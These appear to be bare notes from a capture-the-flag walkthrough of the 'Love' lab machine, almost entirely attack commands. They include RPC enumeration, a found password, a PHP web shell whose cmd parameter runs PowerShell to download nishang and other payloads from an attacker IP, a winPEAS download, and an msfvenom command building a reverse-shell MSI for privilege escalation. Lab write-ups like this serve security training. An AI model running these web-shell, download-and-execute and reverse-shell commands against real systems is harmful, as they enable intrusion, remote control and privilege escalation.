```
rpcdump.py 10.10.10.239
```

```sh
staging.love.htb
```

```
@LoveIsInTheAir!!!!
```

```
http://love.htb/images/shell123.php?cmd=powershell -c IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/nishang.ps1', 'shell123.ps1')

http://love.htb/images/shell123.php?cmd=.\shell123.exe

powershell.exe -ExecutionPolicy Bypass -NonInteractive -File shell123.exe
```


```
powershell wget http://10.10.14.5/winPEASx86_ofs.exe -outfile wp.exe
```

```
msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f msi -o rev.msi
```

## Referensi
- https://www.hackingarticles.in/windows-privilege-escalation-scheduled-task-job-t1573-005/